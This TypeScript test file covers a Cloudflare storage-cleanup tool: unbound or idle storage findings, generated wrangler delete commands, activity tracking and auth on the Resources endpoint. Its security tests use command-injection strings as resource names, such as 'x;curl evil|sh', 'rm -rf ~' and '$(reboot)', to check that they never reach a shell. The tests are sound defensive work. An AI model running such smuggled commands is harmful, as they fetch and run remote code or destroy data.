// Unused storage with evidence: last activity and size on "not bound", bound-but-idle storage,
// what deleting a zombie Worker leaves behind, the Resources page and what cleanup frees.
// SPDX-License-Identifier: AGPL-3.0-only
import { afterEach, describe, expect, it, vi } from 'vitest';
import { defaultConfig, thresholdsFor } from '../src/shared/config';
import { checkOf, cleanupFor } from '../src/shared/findings';
import { helpFor } from '../src/shared/help';
import { fmtBytes } from '../src/shared/limits';
import type { Finding } from '../src/shared/types';
import type { WorkerMeta, WorkerStats } from '../src/worker/checks';
import { upsertAccount } from '../src/worker/db';
import { activityOf, boundByMap, storageStatus, zombieFindings, type InventoryFacts, type StorageFact } from '../src/worker/hygiene';
import { housekeepingSummary } from '../src/worker/overview';
import { buildResources } from '../src/worker/resources';
import { runScan } from '../src/worker/scan';
import { createD1 } from './d1';
import { fakeFetch, NOW } from './fixtures';

const KV = '0123456789abcdef0123456789abcdef';
const KV2 = 'fedcba9876543210fedcba9876543210';
const config = defaultConfig();
const tf = (n: string) => thresholdsFor(config, n, []);
const LONG_AGO = '2026-09-01T00:00:00Z';
const hoursAgo = (h: number) => new Date(NOW.getTime() - h * 3_600_000).toISOString().slice(0, 13) + ':00:00Z';

function worker(name: string, bindings: WorkerMeta['bindings'], over: Partial<WorkerMeta> = {}): WorkerMeta {
  return {
    name, groups: [], handlers: ['fetch'], hasModules: true, compatibilityDate: '2026-10-01', compatibilityFlags: [], usageModel: null,
    bindings, workersDev: false, previewsEnabled: false, logsEnabled: null, samplingRate: null, logpush: null,
    deployedOn: '2026-10-01T00:00:00Z', listed: true, deployments: [], ...over,
  };
}
const stats = (name: string, requestsWindow: number): WorkerStats => ({
  name, requests24h: 0, errors24h: 0, requestsPrev: 0, errorsPrev: 0, exceeded24h: 0, cpuP99Max24h: null, lastHourRequests: 0,
  hourlyMedian7d: 0, lastHourCpuUs: 0, hourlyMedianCpuUs7d: 0, lastHourSubrequests: 0, hourlyMedianSubrequests7d: 0, historyHours: 999, requestsWindow,
});
function inv(storage: StorageFact[], over: Partial<InventoryFacts> = {}): InventoryFacts {
  return {
    bindingsComplete: true, refreshed: true, storage, routes: [], domains: [], accessDomains: null, workersSubdomain: null,
    trackingDays: 60, retentionDays: 30, activitySince: { kv: LONG_AGO, d1: LONG_AGO, r2: LONG_AGO, queues: LONG_AGO }, ...over,
  };
}
const byCode = (fs: Finding[]) => Object.fromEntries(fs.map((f) => [f.code, f]));

describe('activity and status', () => {
  it('only claims "no operations" for collected kinds tracked for the whole window', () => {
    const s: StorageFact = { kind: 'd1', id: 'db', name: 'db', lastActiveHour: null };
    expect(activityOf(s, { activitySince: { d1: LONG_AGO } }, NOW, 30)).toBe('quiet');
    expect(activityOf(s, { activitySince: { d1: hoursAgo(24 * 10) } }, NOW, 30)).toBe('unknown');
    // Another kind being covered says nothing about this one.
    expect(activityOf(s, { activitySince: { kv: LONG_AGO } }, NOW, 30)).toBe('unknown');
    expect(activityOf({ ...s, lastActiveHour: hoursAgo(5) }, { activitySince: { d1: hoursAgo(6) } }, NOW, 30)).toBe('recent');
    expect(activityOf({ ...s, lastActiveHour: hoursAgo(24 * 10) }, { activitySince: { d1: LONG_AGO } }, NOW, 30)).toBe('earlier');
  });

  it('works out status from bindings and activity', () => {
    const base: StorageFact = { kind: 'kv', id: KV, name: 'cache', boundBy: [] };
    expect(storageStatus(base, 'quiet')).toBe('unbound');
    expect(storageStatus(base, 'recent')).toBe('outside');
    expect(storageStatus({ ...base, boundBy: ['api'] }, 'quiet')).toBe('idle');
    expect(storageStatus({ ...base, boundBy: ['api'] }, 'unknown')).toBe('in-use');
    expect(storageStatus({ ...base, kind: 'queues', inUse: true }, 'quiet')).toBe('in-use');
  });

  it('matches queues by name and the rest by id', () => {
    const m = boundByMap(
      [{ name: 'api', bindings: [{ type: 'queue', target: 'jobs' }, { type: 'kv_namespace', target: KV }] }, { name: 'web', bindings: [{ type: 'kv_namespace', target: KV }] }],
      [{ kind: 'queues', id: 'q-id', name: 'jobs' }, { kind: 'kv', id: KV, name: 'cache' }, { kind: 'd1', id: 'db', name: 'db' }],
    );
    expect(m.get('queues|q-id')).toEqual(['api']);
    expect(m.get(`kv|${KV}`)).toEqual(['api', 'web']);
    expect(m.get('d1|db')).toEqual([]);
  });

  it('rounds sizes so findings do not change for every byte', () => {
    expect(fmtBytes(0)).toBe('0 B');
    expect(fmtBytes(123_456_789)).toBe('123 MB');
    expect(fmtBytes(1_234_567_890)).toBe('1.2 GB');
  });
});

describe('not bound to any Worker, with evidence', () => {
  it('says when nothing used it, how big it is, and when it is empty', () => {
    const fs = byCode(zombieFindings(NOW, [worker('api', [])], [stats('api', 1)], inv([
      { kind: 'd1', id: 'db-uuid', name: 'old-db', boundBy: [], lastActiveHour: null, bytes: 123_456_789 },
      { kind: 'r2', id: 'assets', name: 'assets', boundBy: [], lastActiveHour: hoursAgo(24 * 10), bytes: 0, objects: 0 },
    ]), tf));
    expect(fs['unbound-d1-db-uuid'].message).toBe('D1 database old-db is not bound to any Worker. No operations in the last 30 days.');
    expect(fs['unbound-d1-db-uuid'].evidence).toEqual({ d1: 'old-db', lastUsed: 'none in 30 days', size: '123 MB' });
    expect(fs['unbound-r2-assets'].message).toBe(`R2 bucket assets is not bound to any Worker. Last operations on ${hoursAgo(240).slice(0, 10)}, none since. It is empty.`);
    expect(cleanupFor(fs['unbound-d1-db-uuid'])?.commands).toEqual(['npx wrangler d1 export old-db --remote --output=old-db-backup.sql', 'npx wrangler d1 delete old-db']);
  });

  it('gives no delete command while something outside Workers still uses it', () => {
    const fs = byCode(zombieFindings(NOW, [], [], inv([{ kind: 'kv', id: KV, name: 'cache', boundBy: [], lastActiveHour: hoursAgo(3) }]), tf));
    const f = fs[`unbound-kv-${KV}`];
    expect(f.message).toContain('but it had operations on');
    expect(f.evidence.stillUsed).toBe('yes');
    expect(cleanupFor(f)).toEqual({ commands: [], note: expect.stringContaining('no delete command yet') });
  });

  it('keeps today\'s wording when operations are not collected', () => {
    const fs = byCode(zombieFindings(NOW, [], [], inv([{ kind: 'kv', id: KV, name: 'cache', boundBy: [] }], { activitySince: {} }), tf));
    expect(fs[`unbound-kv-${KV}`].message).toBe('KV namespace cache is not bound to any Worker.');
  });

  it('does not flag storage bound by an out-of-scope Worker', () => {
    // Only "api" is in scope (meta), but "other-team" binds the namespace.
    const fs = zombieFindings(NOW, [worker('api', [])], [stats('api', 1)], inv([{ kind: 'kv', id: KV, name: 'cache', boundBy: ['other-team'], lastActiveHour: hoursAgo(3) }]), tf);
    expect(fs.filter((f) => f.code.includes(KV))).toEqual([]);
  });

  it('says nothing about storage until the inventory and bindings are in', () => {
    const s: StorageFact[] = [{ kind: 'kv', id: KV, name: 'cache', boundBy: [] }];
    expect(zombieFindings(NOW, [], [], inv(s, { bindingsComplete: false }), tf)).toEqual([]);
    expect(zombieFindings(NOW, [], [], inv(s, { refreshed: false }), tf)).toEqual([]);
  });
});

describe('bound but idle', () => {
  it('flags storage a busy Worker binds but never uses', () => {
    const fs = byCode(zombieFindings(NOW, [worker('api', [{ type: 'd1', name: 'DB', target: 'db-uuid' }])], [stats('api', 1)],
      inv([{ kind: 'd1', id: 'db-uuid', name: 'old-db', boundBy: ['api'], lastActiveHour: null, bytes: 5e6 }]), tf));
    const f = fs['bound-idle-d1-db-uuid'];
    expect(checkOf(f)).toBe('zombies:bound-idle-d1');
    expect(f.message).toBe('D1 database old-db had no operations in the last 30 days, though api binds it.');
    expect(f.evidence).toMatchObject({ boundTo: 'api', size: '5 MB' });
    expect(cleanupFor(f)?.note).toMatch(/^First remove the binding/);
    expect(helpFor('zombies:bound-idle-d1')).toBeTruthy();
  });

  it('is not raised while there is activity, or before the window is covered', () => {
    const meta = [worker('api', [])];
    const s = (over: Partial<StorageFact>): StorageFact => ({ kind: 'kv', id: KV, name: 'cache', boundBy: ['api'], ...over });
    expect(zombieFindings(NOW, meta, [stats('api', 1)], inv([s({ lastActiveHour: hoursAgo(24 * 5) })]), tf)).toEqual([]);
    expect(zombieFindings(NOW, meta, [stats('api', 1)], inv([s({ lastActiveHour: null })], { activitySince: { kv: hoursAgo(24 * 5) } }), tf)).toEqual([]);
  });

  it('says when every Worker that binds it is unused too', () => {
    const meta = [worker('a', []), worker('b', [])];
    const fs = byCode(zombieFindings(NOW, meta, [stats('a', 0), stats('b', 0)], inv([{ kind: 'kv', id: KV, name: 'shared', boundBy: ['a', 'b'], lastActiveHour: null }]), tf));
    expect(fs[`bound-idle-kv-${KV}`].message).toContain('Those Workers are unused too.');
  });
});

describe('what deleting a zombie Worker leaves behind', () => {
  const meta = [worker('old-api', [{ type: 'kv_namespace', name: 'C', target: KV }]), worker('web', [])];
  const storage: StorageFact[] = [
    { kind: 'kv', id: KV, name: 'sessions', boundBy: ['old-api'], lastActiveHour: null },
    { kind: 'd1', id: 'db-uuid', name: 'old-db', boundBy: ['old-api'], lastActiveHour: null },
    { kind: 'r2', id: 'shared', name: 'shared', boundBy: ['old-api', 'web'], lastActiveHour: null },
    { kind: 'r2', id: 'files', name: 'files', boundBy: ['old-api'], lastActiveHour: hoursAgo(2) },
  ];

  it('lists storage only that Worker uses, with the commands to delete it too', () => {
    const fs = byCode(zombieFindings(NOW, meta, [stats('old-api', 0), stats('web', 1)], inv(storage), tf));
    const f = fs['no-traffic'];
    expect(f.evidence.leavesBehind).toBe('KV namespace sessions, D1 database old-db, R2 bucket files');
    expect(f.evidence.stillUsed).toBe('files');
    const c = cleanupFor(f)!;
    expect(c.commands).toEqual([
      'npx wrangler delete --name old-api',
      `npx wrangler kv namespace delete --namespace-id=${KV}`,
      'npx wrangler d1 export old-db --remote --output=old-db-backup.sql',
      'npx wrangler d1 delete old-db',
    ]);
    expect(c.note).toContain('files still had operations');
    // Storage only this Worker binds is listed here, not raised a second time as bound but idle.
    expect(Object.keys(fs).filter((k) => k.startsWith('bound-idle'))).toEqual(['bound-idle-r2-shared']);
  });

  it('gives no command for names that are not shell-safe', () => {
    const f: Finding = {
      id: 'x', module: 'zombies', script: 'old-api', code: 'no-traffic', severity: 'info', message: 'm', action: 'a',
      evidence: { days: 30, leavesBehind: 'D1 database x', _cleanup: 'd1:x;rm kv:not-an-id' },
    };
    const c = cleanupFor(f)!;
    expect(c.commands).toEqual(['npx wrangler delete --name old-api']);
    expect(c.note).toContain('not safe to put in a shell command');
  });
});

describe('what cleanup frees', () => {
  const finding = (code: string, evidence: Finding['evidence'] = {}): Finding => ({ id: code, module: 'zombies', script: '*', code, severity: 'info', message: '', action: '', evidence });
  const sizes = [{ kind: 'd1' as const, id: 'db', bytes: 250e6 }, { kind: 'kv' as const, id: KV, bytes: 1e6 }, { kind: 'kv' as const, id: KV2, bytes: 9e6 }];
  const totals = new Map([['d1', 1e9], ['kv', 10e6]] as const);
  const caps = { d1: { account: 5e9 }, kv: { account: 1e9 }, r2: { account: 10e9 }, do: { account: 5e9 } };

  it('adds up unused and idle storage, but not storage still in use', () => {
    const h = housekeepingSummary(
      [finding('unbound-d1-db'), finding(`bound-idle-kv-${KV}`), finding(`unbound-kv-${KV2}`, { stillUsed: 'yes' })],
      sizes, new Map(totals), caps, false, 3,
    );
    expect(h).toEqual({ frees: [{ kind: 'd1', bytes: 250e6, share: 0.05 }, { kind: 'kv', bytes: 1e6, share: 0.001 }], monthlySaving: null, resolvedThisWeek: 3 });
  });
});

describe('scans keep the last activity per resource', () => {
  afterEach(() => vi.unstubAllGlobals());

  it('stores it, uses it in the finding, and never moves it backwards', async () => {
    const env = { DB: createD1(), ASSETS: {} as Fetcher, CF_API_TOKEN: 't', ADMIN_PASSPHRASE: 'correct horse battery staple' };
    await upsertAccount(env.DB, { id: 'acc1' }, NOW).run();
    // The first scan stores the inventory; storage operations are read for the kinds it found.
    vi.stubGlobal('fetch', fakeFetch().fn);
    await runScan(env, new Date(NOW.getTime() - 3_600_000), { account: 'acc1' });
    vi.stubGlobal('fetch', fakeFetch({ kvOps: [{ namespaceId: 'ns-unused', datetimeHour: '2026-11-09T10:00:00Z', requests: 4 }] }).fn);
    await runScan(env, NOW, { account: 'acc1', force: true });
    const row = () => env.DB.prepare(`SELECT last_active_hour AS h FROM resource_activity WHERE account = 'acc1' AND kind = 'kv' AND resource = 'ns-unused'`).first<{ h: string }>();
    expect((await row())?.h).toBe('2026-11-09T10:00:00Z');
    const f = await env.DB.prepare(`SELECT message, evidence FROM findings WHERE code = 'unbound-kv-ns-unused'`).first<{ message: string; evidence: string }>();
    expect(f?.message).toContain('but it had operations on 2026-11-09');
    expect(JSON.parse(f!.evidence).stillUsed).toBe('yes');

    // A later scan that sees an older hour does not move it back.
    vi.stubGlobal('fetch', fakeFetch({ kvOps: [{ namespaceId: 'ns-unused', datetimeHour: '2026-11-09T08:00:00Z', requests: 1 }] }).fn);
    await runScan(env, new Date(NOW.getTime() + 3_600_000), { account: 'acc1', force: true });
    expect((await row())?.h).toBe('2026-11-09T10:00:00Z');

    const view = await buildResources(env.DB, 'acc1', config, NOW);
    expect(view.ready).toBe(true);
    const byName = Object.fromEntries(view.resources.map((r) => [r.name, r]));
    expect(byName.forgotten).toMatchObject({ kind: 'kv', boundBy: [], status: 'outside', lastActiveHour: '2026-11-09T10:00:00Z', activity: 'recent' });
    expect(byName.cache).toMatchObject({ boundBy: ['api'], status: 'in-use' });
    // Outside use sorts first: it is the one not to delete.
    expect(view.resources[0].name).toBe('forgotten');
  });
});

describe('security and cost of the housekeeping changes', () => {
  afterEach(() => vi.unstubAllGlobals());
  const newEnv = () => ({ DB: createD1(), ASSETS: {} as Fetcher, CF_API_TOKEN: 't', ADMIN_PASSPHRASE: 'correct horse battery staple' });
  const H = 3_600_000;

  it('never turns a resource name from the API into part of a command', () => {
    // A D1 name with a space must not become a command for a different database ("my").
    const meta = [worker('old', [])];
    const evil: StorageFact[] = [
      { kind: 'd1', id: 'u1', name: 'my db', boundBy: ['old'], lastActiveHour: null },
      { kind: 'r2', id: 'b', name: 'x;curl evil|sh', boundBy: ['old'], lastActiveHour: null },
      { kind: 'queues', id: 'q', name: '$(reboot)', boundBy: ['old'], lastActiveHour: null },
      { kind: 'kv', id: 'not-hex; rm -rf ~', name: 'ok', boundBy: ['old'], lastActiveHour: null },
    ];
    const f = byCode(zombieFindings(NOW, meta, [stats('old', 0)], inv(evil), tf))['no-traffic'];
    expect(f.evidence._cleanup).toBe('d1:? r2:? queues:? kv:?');
    const c = cleanupFor(f)!;
    expect(c.commands).toEqual(['npx wrangler delete --name old']);
    expect(c.note).toContain('not safe to put in a shell command');
    // The same names on their own findings get no command either.
    const own = zombieFindings(NOW, [], [], inv(evil.map((s) => ({ ...s, boundBy: [] }))), tf);
    expect(own.map((x) => cleanupFor(x))).toEqual([null, null, null, null]);
  });

  it('ignores a forged _cleanup value', () => {
    const forged = (v: string): Finding => ({ id: 'x', module: 'zombies', script: 'w', code: 'no-traffic', severity: 'info', message: '', action: '', evidence: { leavesBehind: 'x', _cleanup: v } });
    for (const v of ['d1:a --force; rm -rf ~', 'r2:`id`', 'kv:../../etc', 'sh:-c', ':', 'd1:', 'queues:a\nrm']) {
      expect(cleanupFor(forged(v))!.commands.every((cmd) => /^npx wrangler [\w :=.-]+$/.test(cmd))).toBe(true);
    }
    expect(cleanupFor(forged('d1:a --force; rm -rf ~'))!.commands).toEqual(['npx wrangler delete --name w', 'npx wrangler d1 export a --remote --output=a-backup.sql', 'npx wrangler d1 delete a']);
  });

  it('keeps the day, not the hour, in evidence so a busy resource does not rewrite its finding every scan', () => {
    const at = (h: number) => byCode(zombieFindings(NOW, [], [], inv([{ kind: 'kv', id: KV, name: 'c', boundBy: [], lastActiveHour: hoursAgo(h) }]), tf))[`unbound-kv-${KV}`];
    expect(at(3)).toEqual(at(4));
  });

  it('only claims "no operations" for a kind it has read without a gap', async () => {
    const env = newEnv();
    await upsertAccount(env.DB, { id: 'acc1' }, NOW).run();
    const since = () => env.DB.prepare(`SELECT value FROM account_state WHERE account = 'acc1' AND key = 'ops_since'`).first<{ value: string }>().then((r) => JSON.parse(r?.value ?? '{}'));
    vi.stubGlobal('fetch', fakeFetch().fn);
    await runScan(env, NOW, { account: 'acc1' }); // stores the inventory
    vi.stubGlobal('fetch', fakeFetch({ kvOps: [] }).fn);
    await runScan(env, new Date(NOW.getTime() + H), { account: 'acc1', force: true });
    const first = await since();
    expect(Object.keys(first)).toEqual(['kv']);
    await runScan(env, new Date(NOW.getTime() + 2 * H), { account: 'acc1', force: true });
    expect(await since()).toEqual(first); // unchanged while reads continue
    // The dataset stops answering: coverage ends, and with it any "no operations" claim.
    vi.stubGlobal('fetch', fakeFetch().fn);
    await runScan(env, new Date(NOW.getTime() + 27 * H), { account: 'acc1', force: true });
    expect(await since()).toEqual({});
    const f = await env.DB.prepare(`SELECT message FROM findings WHERE code = 'unbound-kv-ns-unused'`).first<{ message: string }>();
    expect(f?.message).toBe('KV namespace forgotten is not bound to any Worker.');
  });

  it('writes a resource\'s last activity at most once per 6 hours, and nothing when nothing changed', async () => {
    const env = newEnv();
    await upsertAccount(env.DB, { id: 'acc1' }, NOW).run();
    vi.stubGlobal('fetch', fakeFetch().fn);
    await runScan(env, NOW, { account: 'acc1' });
    const hour = (h: number) => new Date(Date.parse('2026-11-09T12:00:00Z') + h * H).toISOString().replace('.000', '');
    const row = () => env.DB.prepare(`SELECT last_active_hour AS h FROM resource_activity WHERE resource = 'ns-used'`).first<{ h: string }>();
    const scanAt = async (h: number) => {
      vi.stubGlobal('fetch', fakeFetch({ kvOps: [{ namespaceId: 'ns-used', datetimeHour: hour(h), requests: 5 }] }).fn);
      await runScan(env, new Date(Date.parse(hour(h)) + 20 * 60_000), { account: 'acc1', force: true });
    };
    await scanAt(0);
    expect((await row())?.h).toBe(hour(0));
    for (const h of [1, 2, 3, 4, 5]) await scanAt(h);
    expect((await row())?.h).toBe(hour(0)); // five busy hours, no write
    await scanAt(6);
    expect((await row())?.h).toBe(hour(6));
    // The table has no second index: one row per write.
    const idx = await env.DB.prepare(`SELECT COUNT(*) AS n FROM sqlite_master WHERE tbl_name = 'resource_activity'`).first<{ n: number }>();
    expect(idx?.n).toBe(1);
  });

  it('adds nothing to the dashboard\'s reads: the weekly count comes from the account state', async () => {
    const { buildOverview } = await import('../src/worker/overview');
    const env = newEnv();
    await upsertAccount(env.DB, { id: 'acc1' }, NOW).run();
    vi.stubGlobal('fetch', fakeFetch().fn);
    await runScan(env, NOW, { account: 'acc1' });
    await env.DB.prepare(`UPDATE findings SET status = 'resolved', last_seen = ?1 WHERE code = 'never-deployed'`).bind(NOW.toISOString()).run();
    const seen: string[] = [];
    const db = env.DB;
    const spy = { ...db, prepare: (sql: string) => (seen.push(sql), db.prepare(sql)), batch: db.batch.bind(db) } as D1Database;
    expect((await buildOverview({ ...env, DB: spy }, 'acc1', NOW)).housekeeping.resolvedThisWeek).toBe(0); // not counted yet
    expect(seen.filter((s) => /FROM findings/.test(s))).toHaveLength(1); // only the open findings, as before
    // The next daily inventory refresh counts it (a finding no scan raises again, resolved 2 days before).
    await env.DB.prepare(
      `INSERT INTO findings (id, account, script, module, severity, code, message, evidence, action, first_seen, last_seen, status)
       VALUES ('acc1/zombies:*:unbound-kv-gone', 'acc1', '*', 'zombies', 'info', 'unbound-kv-gone', 'm', '{}', 'a', ?1, ?1, 'resolved')`,
    ).bind(new Date(NOW.getTime() + 20 * H).toISOString()).run();
    await runScan(env, new Date(NOW.getTime() + 26 * H), { account: 'acc1', force: true });
    expect((await buildOverview(env, 'acc1', new Date(NOW.getTime() + 26 * H))).housekeeping.resolvedThisWeek).toBeGreaterThanOrEqual(1);
  });
});

describe('the Resources endpoint', () => {
  it('needs a session like every other API route', async () => {
    const worker = (await import('../src/worker/index')).default as { fetch: (r: Request, e: unknown, c: unknown) => Promise<Response> };
    const env = { DB: createD1(), ASSETS: {} as Fetcher, CF_API_TOKEN: 't', ADMIN_PASSPHRASE: 'correct horse battery staple' };
    const ctx = { waitUntil: () => {}, passThroughOnException: () => {} };
    for (const path of ['/api/resources', '/api/resources?account=acc1']) {
      const res = await worker.fetch(new Request(`https://ambersight.example${path}`), env, ctx);
      expect(res.status).toBe(401);
      expect(await res.text()).not.toContain('resources');
    }
  });
});
